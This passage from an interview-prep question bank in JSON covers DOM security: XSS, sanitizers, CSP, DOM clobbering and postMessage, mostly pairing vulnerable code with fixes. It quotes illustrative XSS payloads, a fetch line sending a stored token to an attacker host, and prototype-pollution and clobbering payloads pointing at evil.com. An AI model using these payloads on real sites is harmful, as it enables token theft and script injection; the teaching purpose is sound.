    "question": "Why do aria-labelledby and aria-describedby fail when referencing an ID inside a different Shadow Root, and how is this resolved?",
    "shortAnswer": "ARIA ID references are scoped strictly within the same DOM root; an ID inside a shadow root is invisible to an element in the light DOM. This is resolved using Cross-Root ARIA or ARIA Element Reflection.",
    "detailedExplanation": "- **Tree Isolation**: `document.getElementById()` cannot find elements in shadow roots; ARIA ID resolution follows the exact same scope boundary.\n- **ARIA Element Reflection**: Modern browsers support assigning element references directly: `input.ariaLabelledByElements = [headerElement]`.\n- **Slot Pattern**: Project the label through a slot so both elements exist within the same shadow context.",
    "codeExample": "// ARIA Element Reflection (bypasses string ID boundaries):\nconst customInput = document.querySelector('custom-input');\nconst outerLabel = document.querySelector('#external-label');\n\n// Direct node reference across boundaries:\ncustomInput.ariaLabelledByElements = [outerLabel];",
    "interviewTips": [
      "Cite ARIA Element Reflection (`ariaLabelledByElements`) as the modern solution for cross-boundary accessibility."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "DOM-Based XSS Definition",
    "difficulty": "EASY",
    "questionType": "SECURITY",
    "question": "What is DOM-based Cross-Site Scripting (DOM XSS) and how does it occur?",
    "shortAnswer": "DOM XSS occurs when client-side JavaScript reads data from an untrusted source (like location.search or hash) and writes it into an unsafe DOM sink (like innerHTML or eval) without sanitization.",
    "detailedExplanation": "- **Client-Side Only**: Does not require the server to reflect malicious payloads; the vulnerability exists entirely in client-side JavaScript.\n- **Sources**: `location.search`, `location.hash`, `document.referrer`, `localStorage`, `postMessage`.\n- **Sinks**: `element.innerHTML`, `outerHTML`, `document.write()`, `location.href`.\n- **Prevention**: Use `element.textContent` or strict sanitization libraries like DOMPurify.",
    "codeExample": "// VULNERABLE TO DOM XSS:\nconst params = new URLSearchParams(window.location.search);\nconst username = params.get('user'); // Source\n// Injects malicious script directly into DOM:\ndocument.querySelector('#greeting').innerHTML = `Hello ${username}`; // Sink!\n\n// SAFE FIX:\ndocument.querySelector('#greeting').textContent = `Hello ${username}`;",
    "interviewTips": [
      "Always define DOM XSS using the 'Source -> Sink' concept: untrusted source flowing directly into an executable DOM sink."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "innerHTML vs textContent for User Input",
    "difficulty": "EASY",
    "questionType": "COMPARISON",
    "question": "Why should you never use innerHTML to insert user-submitted text into the DOM?",
    "shortAnswer": "`innerHTML` parses string content as executable HTML markup, allowing attackers to inject malicious `<img onerror=\"...\">` or `<script>` tags, whereas `textContent` treats all input strictly as inert plain text.",
    "detailedExplanation": "- **Markup Parsing**: `innerHTML` invokes the browser's HTML parser; if user text contains `<img src=x onerror=alert(1)>`, the script executes.\n- **Plain Text Safety**: `textContent` escapes characters automatically, rendering `<` as `&lt;` on screen without execution.\n- **Performance**: `textContent` is also significantly faster because it bypasses the HTML parser.",
    "codeExample": "const commentText = '<img src=x onerror=\"stealCookies()\">';\n\n// DANGEROUS (executes script via image onerror):\n// container.innerHTML = commentText;\n\n// 100% SAFE (renders string literally on screen):\ncontainer.textContent = commentText;",
    "interviewTips": [
      "Use the `<img src=x onerror=...>` example because modern browsers block `<script>` inside `innerHTML`, making `onerror` the primary vector."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Safe External Links: rel='noopener noreferrer'",
    "difficulty": "EASY",
    "questionType": "SECURITY",
    "question": "Why is rel='noopener noreferrer' essential when creating links with target='_blank'?",
    "shortAnswer": "It prevents the newly opened tab from accessing the opening window via `window.opener`, protecting against reverse tabnabbing attacks where the child tab redirects your app to a phishing page.",
    "detailedExplanation": "- **Reverse Tabnabbing**: Without `noopener`, the opened page can run `window.opener.location = 'https://fake-login.com'`, silently phishing the user.\n- **Modern Browser Default**: Modern evergreen browsers automatically imply `rel=\"noopener\"` on `target=\"_blank\"`, but explicitly writing it remains best practice.\n- **noreferrer**: Also omits the HTTP `Referer` header to avoid leaking sensitive URLs in tokens.",
    "codeExample": "<!-- Secure external link: -->\n<a \n  href=\"https://external-resource.com\" \n  target=\"_blank\" \n  rel=\"noopener noreferrer\"\n>\n  Visit Partner Site\n</a>",
    "interviewTips": [
      "Mention 'reverse tabnabbing' and `window.opener.location` manipulation as the core threat."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Dangerous DOM Sinks: document.write()",
    "difficulty": "EASY",
    "questionType": "SECURITY",
    "question": "Why is document.write() considered an obsolete and dangerous DOM API?",
    "shortAnswer": "`document.write()` is a high-risk XSS sink that blocks HTML parsing, delays page rendering, and if executed after page load, completely wipes out the entire existing document.",
    "detailedExplanation": "- **Document Wiping**: Calling `document.write()` after the document has finished loading implicitly calls `document.open()`, erasing all existing DOM elements.\n- **Parser Blocking**: Forces the HTML parser to pause and wait, hurting Core Web Vitals.\n- **Interventions**: Modern browsers block `document.write()` script injections on slow 2G/3G connections.",
    "codeExample": "// DANGEROUS & DEPRECATED:\n// document.write('<p>User: ' + location.search + '</p>');\n\n// MODERN & SAFE:\nconst p = document.createElement('p');\np.textContent = `User: ${location.search}`;\ndocument.body.appendChild(p);",
    "interviewTips": [
      "State that `document.write()` wipes out the entire HTML document if invoked after the page has loaded."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Sanitizing href and src Attributes (javascript: URIs)",
    "difficulty": "EASY",
    "questionType": "SECURITY",
    "question": "How can user-provided URLs in <a href> or <iframe src> execute malicious code even without <script> tags?",
    "shortAnswer": "Attackers can provide a URL starting with the `javascript:` pseudo-protocol (e.g. `javascript:alert(document.cookie)`), which executes arbitrary JavaScript when the link is clicked.",
    "detailedExplanation": "- **javascript: Execution**: Clicking `<a href=\"javascript:attack()\">` executes script in the current page's origin.\n- **Data URIs**: `data:text/html,...` can similarly load untrusted HTML in iframes.\n- **Protocol Whitelisting**: Always validate that URLs start with approved protocols: `http://`, `https://`, or `mailto:`.",
    "codeExample": "function isSafeUrl(url) {\n  try {\n    const parsed = new URL(url, window.location.origin);\n    return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);\n  } catch {\n    return false; // Malformed URL\n  }\n}\n\n// Safe link assignment:\nif (isSafeUrl(userSuppliedUrl)) {\n  linkElement.href = userSuppliedUrl;\n} else {\n  linkElement.href = '#';\n}",
    "interviewTips": [
      "Always emphasize validating URL protocols (`http:` and `https:`) using the native `new URL()` constructor."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "HTML Sanitizer API (element.setHTML)",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "What is the native HTML Sanitizer API and how does element.setHTML() improve on innerHTML?",
    "shortAnswer": "The Sanitizer API allows safe HTML insertion by parsing and automatically stripping out executable scripts, event handlers (`onclick`, `onerror`), and unsafe tags before inserting nodes into the DOM.",
    "detailedExplanation": "- **Native Browser Engine**: Built directly into the browser, eliminating the need for 50KB third-party libraries like DOMPurify.\n- **Safe Sinks**: Replaces `element.innerHTML = html` with `element.setHTML(html, { sanitizer })`.\n- **Configurable**: Allows specifying custom `allowElements`, `blockElements`, and `allowAttributes` rules.",
    "codeExample": "const untrustedInput = '<p>Hello <script>stealData()</script><img src=x onerror=alert(1)></p>';\n\nconst container = document.querySelector('#safe-container');\n\n// Native Sanitizer strips script and onerror attributes automatically:\nif ('setHTML' in container) {\n  container.setHTML(untrustedInput);\n  // Resulting DOM: <p>Hello <img src=\"x\"></p>\n}",
    "interviewTips": [
      "Highlight the native Sanitizer API as the future web standard that replaces third-party libraries like DOMPurify."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Trusted Types API Overview",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "What is the Trusted Types API and how does it prevent DOM-based XSS at the browser level?",
    "shortAnswer": "Trusted Types locks down dangerous DOM sinks (like innerHTML and script.src) so they reject raw strings, requiring values to be wrapped in certified `TrustedHTML` or `TrustedScriptURL` objects generated by approved policies.",
    "detailedExplanation": "- **Enforcement via CSP**: Activated by the HTTP header `Content-Security-Policy: require-trusted-types-for 'script'`.\n- **Type Safety**: Attempting `element.innerHTML = 'raw string'` throws a `TypeError` in the browser console.\n- **Centralized Policies**: Sanitization logic is centralized into audited policies created via `trustedTypes.createPolicy()`.",
    "codeExample": "// Creating a Trusted Types policy:\nif (window.trustedTypes && window.trustedTypes.createPolicy) {\n  const escapePolicy = window.trustedTypes.createPolicy('my-escape-policy', {\n    createHTML: (string) => DOMPurify.sanitize(string)\n  });\n\n  // Passes certified TrustedHTML to the sink:\n  container.innerHTML = escapePolicy.createHTML(untrustedUserInput);\n}",
    "interviewTips": [
      "Trusted Types is considered the holy grail of DOM XSS prevention by security teams at Google and Microsoft."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "DOM Clobbering Explained",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "What is DOM Clobbering and how can HTML elements overwrite global JavaScript variables?",
    "shortAnswer": "DOM Clobbering occurs when HTML markup containing `id` or `name` attributes (like `<form id=\"config\">` or `<a id=\"admin\">`) creates properties on the `window` or `document` object, overwriting global JavaScript variables.",
    "detailedExplanation": "- **Legacy Feature**: Named elements are automatically exposed as properties on `window` and `document` (e.g. `window.myId`).\n- **Exploitation**: An attacker injects `<a id=\"apiConfig\" href=\"https://attacker.com\">` to overwrite `window.apiConfig`, redirecting data fetches.\n- **Defense**: Explicitly declare variables (`const`, `let`), verify types with `instanceof`, or use `Object.freeze()` on configurations.",
    "codeExample": "<!-- Injected user comment markup: -->\n<a id=\"appConfig\" href=\"https://evil-server.com/api\"></a>\n\n<script>\n// Vulnerable fallback pattern:\n// const endpoint = window.appConfig || 'https://real-server.com/api';\n// endpoint will be clobbered by the <a> element!\n\n// Safe approach:\nconst endpoint = (typeof appConfig === 'object' && appConfig.url) ? appConfig.url : 'https://real-server.com/api';\n</script>",
    "interviewTips": [
      "Explain that DOM Clobbering abuses the browser's legacy behavior of creating global `window` properties from element `id` attributes."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Content Security Policy (CSP) & DOM Script Execution",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "How does a Content Security Policy (CSP) restrict inline scripts and unsafe DOM manipulation?",
    "shortAnswer": "A strict CSP using `script-src 'nonce-...'` blocks all inline `<script>` tags, inline event attributes (`onclick`), and strings in `eval()` or `setTimeout()`, neutralizing injected script payloads.",
    "detailedExplanation": "- **Default Blocking**: Disallows inline scripts unless accompanied by a cryptographically random cryptographic nonce matching the HTTP header.\n- **Disabling eval**: `unsafe-eval` directive is blocked by default, neutralizing string execution sinks.\n- **Reporting**: `report-to` or `report-uri` headers log policy violations to server telemetry in real-time.",
    "codeExample": "<!-- HTTP Header: -->\n<!-- Content-Security-Policy: script-src 'nonce-rAnd0m123' 'strict-dynamic'; -->\n\n<!-- Authorized script runs: -->\n<script nonce=\"rAnd0m123\" src=\"/bundle.js\"></script>\n\n<!-- Injected attacker script BLOCKED by browser: -->\n<!-- <script>stealCredentials()</script> -->",
    "interviewTips": [
      "Mention that CSP acts as a defense-in-depth barrier that prevents injected XSS from executing even if a DOM sink was compromised."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "DOMParser XSS Hazards",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "Is DOMParser().parseFromString(html, 'text/html') inherently safe from XSS?",
    "shortAnswer": "No, while DOMParser creates an inactive document without executing scripts immediately, inserting the parsed nodes into the active document (or parsing payloads with image onerror attributes) will execute malicious scripts.",
    "detailedExplanation": "- **Inactive Context**: Scripts inside `DOMParser` do not execute during `parseFromString()`.\n- **Activation on Insertion**: As soon as you call `document.body.appendChild(parsedNode)` or access `.innerHTML`, inline event handlers (`onload`, `onerror`) execute.\n- **Sanitization Still Required**: You must sanitize the resulting node tree before attaching it to the live DOM.",
    "codeExample": "const parser = new DOMParser();\nconst doc = parser.parseFromString('<img src=invalid onerror=alert(1)>', 'text/html');\n\n// DANGEROUS: Appending the parsed element triggers the onerror script!\n// document.body.appendChild(doc.body.firstElementChild);",
    "interviewTips": [
      "Clarify that `DOMParser` parses HTML, but does NOT sanitize it; attaching the output to the active document executes any handlers."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "HTML iframe sandbox Attribute",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "How does the iframe sandbox attribute prevent untrusted third-party DOM widgets from attacking your site?",
    "shortAnswer": "The `sandbox` attribute applies strict security restrictions on the iframe content, disabling script execution, form submissions, popups, and same-origin cookies unless explicitly re-enabled via permission tokens.",
    "detailedExplanation": "- **Maximum Isolation (`sandbox=\"\"`)**: Treats the iframe as a unique origin, disables scripts, prevents form submission, and blocks top-navigation.\n- **Granular Permissions**: `allow-scripts` (run JS), `allow-same-origin` (access cookies/storage), `allow-forms` (submit forms).\n- **Critical Caution**: NEVER combine `allow-scripts` and `allow-same-origin` on untrusted content, because script inside the iframe can programmatically remove the sandbox attribute.",
    "codeExample": "<!-- Secure sandboxed iframe for rendering untrusted user widgets: -->\n<iframe \n  src=\"/user-embed.html\" \n  sandbox=\"allow-scripts\"\n  title=\"Untrusted Widget Preview\"\n></iframe>",
    "interviewTips": [
      "Highlight the golden rule: never combine `allow-scripts` with `allow-same-origin` on untrusted iframe sources."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Subresource Integrity (SRI)",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "What is Subresource Integrity (SRI) and how does it prevent CDN-compromised DOM attacks?",
    "shortAnswer": "SRI verifies that files fetched from third-party CDNs (like `<script>` or `<link>`) match a cryptographic base64 hash (`integrity=\"sha384-...\"`), causing the browser to reject the script if modified by attackers.",
    "detailedExplanation": "- **CDN Compromise Defense**: If an attacker hacks a public CDN and modifies a JavaScript library, SRI blocks the script from running in your users' browsers.\n- **Hash Verification**: Browser calculates the cryptographic SHA hash of the downloaded bytes and compares it to the `integrity` attribute.\n- **CORS Requirement**: External scripts using SRI must also have `crossorigin=\"anonymous\"`.",
    "codeExample": "<script \n  src=\"https://cdn.example.com/library.min.js\" \n  integrity=\"sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC\" \n  crossorigin=\"anonymous\"\n></script>",
    "interviewTips": [
      "Mention that SRI requires `crossorigin=\"anonymous\"` to allow cross-origin hash verification."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Safe DocumentFragment Sanitization Pattern",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you safely render rich markdown-generated HTML using DOMPurify before inserting it into the DOM?",
    "shortAnswer": "Pass the raw HTML string to `DOMPurify.sanitize(dirtyHtml, { RETURN_DOM_FRAGMENT: true })` and append the returned safe DocumentFragment directly to the DOM.",
    "detailedExplanation": "- **RETURN_DOM_FRAGMENT**: Avoids re-serializing to a string and re-parsing with `innerHTML`.\n- **Atomic Insertion**: DocumentFragment inserts all sanitized nodes in a single layout operation.\n- **Hook Extensibility**: DOMPurify allows custom hooks to enforce `rel=\"noopener\"` on all sanitized anchor links automatically.",
    "codeExample": "import DOMPurify from 'dompurify';\n\nfunction renderMarkdownHtml(dirtyHtml, container) {\n  // Sanitizes and returns safe DocumentFragment directly:\n  const safeFragment = DOMPurify.sanitize(dirtyHtml, {\n    RETURN_DOM_FRAGMENT: true\n  });\n  \n  container.replaceChildren(safeFragment); // Clean, safe atomic insertion\n}",
    "interviewTips": [
      "Recommend `RETURN_DOM_FRAGMENT: true` in DOMPurify as best practice for maximum performance and security."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Clickjacking & Framebusting Defense",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "What is Clickjacking and how does Content-Security-Policy frame-ancestors protect DOM interfaces from being invisibly framed?",
    "shortAnswer": "Clickjacking tricks users into clicking disguised interactive buttons by embedding the victim site inside a transparent iframe; the `Content-Security-Policy: frame-ancestors 'none'` header blocks unauthorized sites from embedding your page.",
    "detailedExplanation": "- **Attack Mechanism**: Attacker overlays an invisible iframe of your banking or settings page on top of an appealing game button.\n- **CSP frame-ancestors**: Replaces the obsolete `X-Frame-Options: DENY` header with granular domain policies.\n- **frame-ancestors 'self'**: Allows framing only within your own domain's portals.",
    "codeExample": "<!-- Modern HTTP Response Header: -->\n<!-- Content-Security-Policy: frame-ancestors 'none'; -->\n\n<!-- Legacy HTTP Response Header fallback: -->\n<!-- X-Frame-Options: DENY -->",
    "interviewTips": [
      "Clarify that `frame-ancestors` in CSP is the modern standard replacing the legacy `X-Frame-Options` header."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Preventing Form Action Hijacking",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "How can malicious input modify a form's action attribute and how do you protect against form hijacking?",
    "shortAnswer": "Attackers can manipulate the `form.action` attribute or use submit buttons with `formaction=\"https://evil.com\"` to divert sensitive credentials; validate actions before submission and restrict targets using CSP `form-action`.",
    "detailedExplanation": "- **formaction Attribute**: An injected `<button formaction=\"https://attacker.com\">` overrides the form's normal destination.\n- **CSP form-action**: Restricts endpoints where forms are allowed to post data (`Content-Security-Policy: form-action 'self' https://api.mysite.com`).\n- **Client Verification**: Inspect `e.submitter.formAction` in the `submit` event handler.",
    "codeExample": "form.addEventListener('submit', (e) => {\n  const submitter = e.submitter;\n  const targetUrl = submitter?.formAction || form.action;\n  \n  if (!isWhitelistedDomain(targetUrl)) {\n    e.preventDefault();\n    console.error('Unauthorized form submission destination blocked.');\n  }\n});",
    "interviewTips": [
      "Mention the `formaction` button attribute and the CSP `form-action` directive."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Safe JSON Parsing from DOM Data Attributes",
    "difficulty": "INTERMEDIATE",
    "questionType": "CODE",
    "question": "How do you safely parse JSON data stored in a DOM data-* attribute without breaking on malicious quotes or malformed syntax?",
    "shortAnswer": "Wrap `JSON.parse(element.getAttribute('data-config'))` in a `try...catch` block and ensure server-rendered JSON is escaped against script context breakout.",
    "detailedExplanation": "- **HTML Escaping**: When servers output JSON into HTML attributes, quotes must be escaped as `&quot;` to prevent attribute boundary breakout.\n- **try/catch Safety**: Avoids uncaught syntax errors from crashing execution when attributes are corrupted.\n- **Valid Types**: Ensure the parsed result is an object before accessing properties.",
    "codeExample": "function parseDataConfig(element) {\n  const raw = element.getAttribute('data-config');\n  if (!raw) return null;\n  try {\n    const data = JSON.parse(raw);\n    return typeof data === 'object' && data !== null ? data : null;\n  } catch (err) {\n    console.warn('Malformed JSON in data-config attribute:', err);\n    return null;\n  }\n}",
    "interviewTips": [
      "Remind the interviewer that JSON inside HTML attributes requires `&quot;` escaping on the server."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Session Storage vs Local Storage for Sensitive DOM State",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "Why should sensitive authentication tokens never be stored in localStorage or sessionStorage in a DOM context?",
    "shortAnswer": "Any script running on the page (including third-party analytics, ads, or XSS payloads) has unrestricted synchronous read access to `localStorage` and `sessionStorage`. Store tokens in `HttpOnly` cookies instead.",
    "detailedExplanation": "- **Complete Exposure**: An attacker executing just one line of XSS can extract all tokens via `fetch('attacker.com?k=' + localStorage.getItem('token'))`.\n- **HttpOnly Protection**: Browsers block client-side JavaScript from reading cookies marked with the `HttpOnly` flag entirely.\n- **Refresh Tokens**: Store access tokens in short-lived memory variables and refresh tokens in HttpOnly secure cookies.",
    "codeExample": "// BAD (Vulnerable to instant theft via any DOM XSS injection):\n// localStorage.setItem('authToken', token);\n\n// GOOD (Managed by server via HTTP headers):\n// Set-Cookie: token=xyz; Secure; HttpOnly; SameSite=Strict",
    "interviewTips": [
      "State firmly: 'Tokens in localStorage are always vulnerable to XSS. HttpOnly cookies cannot be read by JavaScript.'"
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Securing SVG Injections in the DOM",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "Why is inserting user-uploaded SVG files directly into the DOM using innerHTML dangerous?",
    "shortAnswer": "SVG is an XML-based document format that natively supports executable `<script>` tags, inline event attributes (`onload`), and external entity requests, making raw SVG injection a direct XSS vector.",
    "detailedExplanation": "- **Executable XML**: Unlike JPEG or PNG, SVG markup can contain `<script>alert('XSS')</script>` which executes when injected via `innerHTML`.\n- **Inline Handlers**: `<svg onload=\"alert(1)\">` fires immediately upon DOM insertion.\n- **Safe Rendering**: Display user SVGs using `<img src=\"user.svg\">` (which disables script execution) instead of embedding raw SVG XML.",
    "codeExample": "<!-- SAFE: Disables scripts and interactions inside SVG automatically -->\n<img src=\"user-avatar.svg\" alt=\"User Avatar\">\n\n<!-- DANGEROUS: Executes any <script> embedded inside the SVG file -->\n<!-- container.innerHTML = rawSvgXmlString; -->",
    "interviewTips": [
      "Key takeaway: Always render user SVGs via `<img>` tags, never inline with `innerHTML`."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "MutationObserver for Security Monitoring (DOM Integrity)",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "How can a MutationObserver be used as a client-side tamper detection mechanism against malicious script injection?",
    "shortAnswer": "Observe `document.head` and `document.body` for `childList` additions and verify that any dynamically added `<script>` or `<iframe>` tags have approved URLs and valid nonces.",
    "detailedExplanation": "- **Real-time Monitoring**: Intercepts unauthorized scripts inserted by rogue browser extensions or compromised third-party vendor tags.\n- **Instant Removal**: Unapproved nodes can be immediately removed with `node.remove()`.\n- **Telemetry**: Report detected tamper events back to security monitoring endpoints.",
    "codeExample": "const securityObserver = new MutationObserver((mutations) => {\n  for (const mutation of mutations) {\n    for (const node of mutation.addedNodes) {\n      if (node.tagName === 'SCRIPT' && !isApprovedScript(node)) {\n        node.remove(); // Neutralizes unauthorized script immediately\n        reportSecurityViolation(node.src || 'inline');\n      }\n    }\n  }\n});\nsecurityObserver.observe(document.documentElement, { childList: true, subtree: true });",
    "interviewTips": [
      "Discuss MutationObserver for tamper detection when asked about frontend defense-in-depth strategies."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "CSP script-src-elem vs script-src-attr",
    "difficulty": "INTERMEDIATE",
    "questionType": "SECURITY",
    "question": "What is the difference between script-src-elem and script-src-attr in Content Security Policy Level 3?",
    "shortAnswer": "`script-src-elem` controls explicit `<script>` elements, while `script-src-attr` controls inline event handler attributes like `onclick` or `onload`.",
    "detailedExplanation": "- **Granular Control**: Allows allowing external script files via nonce while strictly forbidding all inline `onclick` attributes across the application.\n- **Zero-Tolerance for Inline Handlers**: Setting `script-src-attr 'none'` prevents all HTML event handler injections.\n- **CSP Level 3**: Provides finer granularity than the monolithic `script-src` directive.",
    "codeExample": "/* CSP Level 3 Header allowing nonced scripts while completely disabling onclick attributes: */\n/* Content-Security-Policy: script-src-elem 'nonce-xyz'; script-src-attr 'none'; */",
    "interviewTips": [
      "Mention `script-src-attr 'none'` as the cleanest way to enforce modern `addEventListener` usage across an entire organization."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "DOM Clobbering Form Action and Children Arrays",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "How can an attacker clobber form.submit or form.reset using input name attributes?",
    "shortAnswer": "If an `<input>` or `<button>` inside a `<form>` has `name=\"submit\"` or `name=\"reset\"`, the native methods `form.submit()` and `form.reset()` are overwritten by the input DOM element reference, causing script calls to throw a TypeError.",
    "detailedExplanation": "- **Named Form Controls**: Form elements expose child controls as direct named properties (e.g. `form.elements['submit']` and `form.submit`).\n- **Method Shadowing**: The native method `form.submit` is replaced by the `<input name=\"submit\">` DOM element.\n- **Prototype Invocation**: To bypass this clobbering, call the method from the prototype: `HTMLFormElement.prototype.submit.call(form)`.",
    "codeExample": "<!-- Injected markup: -->\n<form id=\"myForm\">\n  <input type=\"text\" name=\"submit\" value=\"attacker\">\n</form>\n\n<script>\nconst form = document.querySelector('#myForm');\n// FAILS: form.submit is an HTMLInputElement, not a function!\n// form.submit(); // TypeError: form.submit is not a function\n\n// RESILIENT BYPASS:\nHTMLFormElement.prototype.submit.call(form);\n</script>",
    "interviewTips": [
      "Demonstrate senior mastery by invoking `HTMLFormElement.prototype.submit.call(form)` to defeat form method clobbering."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Prototype Pollution Leading to DOM XSS",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "How can JavaScript Prototype Pollution escalate into a full client-side DOM XSS vulnerability?",
    "shortAnswer": "Polluting `Object.prototype` injects attacker-controlled properties into uninitialized object configuration options (like script URLs or template strings) that flow directly into DOM sinks like `script.src` or `innerHTML`.",
    "detailedExplanation": "- **Payload Injection**: Attacker pollutes `Object.prototype.src = 'https://attacker.com/evil.js'` via a recursive merge vulnerability.\n- **Vulnerable Code**: Code doing `const s = document.createElement('script'); if (options.src) s.src = options.src;` finds `options.src` on the prototype.\n- **Mitigation**: Use `Object.create(null)` for dictionary options, `Object.freeze(Object.prototype)`, or Map data structures.",
    "codeExample": "// Prototype pollution payload injected via URL query params:\n// ?__proto__[transportUrl]=https://evil.com/logger.js\n\nfunction loadAnalyticsWidget(config = {}) {\n  const script = document.createElement('script');\n  // If config.transportUrl is undefined, it inherits the polluted prototype value!\n  script.src = config.transportUrl || '/default-logger.js';\n  document.head.appendChild(script);\n}",
    "interviewTips": [
      "Explain the escalation chain: Prototype Pollution -> Unset option fallback -> Dangerous DOM sink = DOM XSS."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "Enforcing Trusted Types with Default Policies",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "What is the 'default' policy in Trusted Types and why should it be used with caution?",
    "shortAnswer": "The 'default' policy automatically sanitizes raw strings passed to DOM sinks when no explicit policy was specified, acting as a fallback for legacy libraries but potentially hiding improper unreviewed sink usage.",
    "detailedExplanation": "- **Automatic Fallback**: If code calls `element.innerHTML = rawString` under Trusted Types enforcement, the engine automatically passes `rawString` to the `default` policy's `createHTML` method.\n- **Legacy Migration**: Essential for migrating large codebases with third-party libraries that don't support Trusted Types yet.\n- **Security Trade-off**: If the default policy is too permissive, it defeats the architectural auditability that Trusted Types is designed to provide.",
    "codeExample": "if (window.trustedTypes && trustedTypes.createPolicy) {\n  trustedTypes.createPolicy('default', {\n    createHTML(string) {\n      return DOMPurify.sanitize(string);\n    },\n    createScriptURL(url) {\n      if (isAllowedCdn(url)) return url;\n      throw new Error(`Untrusted script URL blocked: ${url}`);\n    }\n  });\n}",
    "interviewTips": [
      "Describe the 'default' policy as a transitional migration bridge for legacy third-party dependencies."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "PostMessage DOM Injection Security",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "What security validations are mandatory when handling window.postMessage before performing DOM updates?",
    "shortAnswer": "You must strictly verify `event.origin` against an exact whitelist string, check that `event.source` is the expected window, and validate payload schema before modifying the DOM.",
    "detailedExplanation": "- **Origin Spoofing**: Omitting `if (event.origin !== 'https://trusted.com') return;` allows ANY malicious website in another tab or iframe to send commands.\n- **Wildcard Danger**: Never pass `'*'` as `targetOrigin` when sending sensitive messages.\n- **Payload Injection**: Never write `event.data` directly into `innerHTML` or `location.href` without sanitization.",
    "codeExample": "window.addEventListener('message', (event) => {\n  // 1. Mandatory exact origin check (no regex without anchoring):\n  if (event.origin !== 'https://app.verified-partner.com') return;\n  \n  // 2. Validate data structure:\n  if (event.data?.type === 'UPDATE_USER_BADGE') {\n    const badge = document.querySelector('#badge');\n    badge.textContent = String(event.data.badgeName); // Text only, never innerHTML\n  }\n});",
    "interviewTips": [
      "Number one rule of `postMessage`: ALWAYS verify `event.origin` before doing anything else."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "DOM Sanitization Mutation Quirks (mXSS)",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "What is Mutation XSS (mXSS) and how does browser DOM serialization cause it?",
    "shortAnswer": "Mutation XSS occurs when a seemingly safe HTML string is altered or reorganized during the browser's internal HTML parsing and serialization cycle, converting inert markup into an active executable XSS payload.",
    "detailedExplanation": "- **Parsing Discrepancies**: Different engines normalize malformed tags, math/svg namespaces, or foreign content differently.\n- **The Trap**: A sanitizer parses HTML, declares it safe, and serializes it to a string. When assigned to `element.innerHTML`, the browser parses it differently, activating hidden script payloads.\n- **Defense**: Use modern sanitizers (like DOMPurify with mXSS protection) or use the native Sanitizer API that operates directly on node trees.",
    "codeExample": "<!-- Concept of mXSS: Malformed XML namespace alters tag hierarchy after parsing -->\n<!-- <listing>&lt;img src=x onerror=alert(1)&gt;</listing> -->\n<!-- Browser serializer unpacks entities into live tags during assignment -->",
    "interviewTips": [
      "Explain that mXSS happens when the browser's own HTML parser mutates sanitized markup into executable code."
    ]
  },
  {
    "topic": "DOM Security & XSS Prevention",
    "subtopic": "CSP nonce Guessing & Nonce Reuse Hazards",
    "difficulty": "DIFFICULT",
    "questionType": "SECURITY",
    "question": "Why must a CSP nonce be cryptographically random and unique for every single HTTP request?",
    "shortAnswer": "If a nonce is reused, cached, or predictable, an attacker can extract the known nonce and append it to an injected `<script nonce=\"...\">` tag, completely bypassing CSP protections.",
